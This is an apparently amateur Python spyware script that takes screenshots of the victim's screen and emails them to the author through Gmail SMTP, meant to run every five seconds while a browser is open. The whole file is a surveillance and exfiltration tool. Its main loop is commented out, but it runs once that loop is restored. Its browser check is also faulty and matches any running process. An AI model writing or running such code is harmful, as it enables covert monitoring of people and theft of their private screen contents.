"""
    This program will take a ss and send it to me every 5 seconds if the browser is open
"""

import psutil
from time import sleep
from pyautogui import screenshot
from smtplib import SMTP_SSL
from email.message import EmailMessage
import imghdr, time

def sendEmail(to:str):
    Sender_Email = "*UR MAIL*"
    Reciever_Email = to
    Password = "*UR PASSWORD*"
    newMessage = EmailMessage()                         
    newMessage['Subject'] = "new log\t" + str(time.time())
    newMessage['From'] = Sender_Email                   
    newMessage['To'] = Reciever_Email                    
    with open('f.png', 'rb') as f:
        image_data = f.read()
        image_type = imghdr.what(f.name)
        image_name = f.name
    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
    with SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Sender_Email, Password)              
        smtp.send_message(newMessage)


def check_and_mail():
    p = psutil.process_iter()
    for i in p:
            if "safari" or "chrome" or "firefox" in (i.name()).lower():
                s = screenshot()
                break
    s.save("f.png")
    sendEmail("*UR MAIL*")


# main function has been commented as a safety measure

# if __name__ == "__main__":
#     while True:
#         check_and_mail()
#         sleep(5)

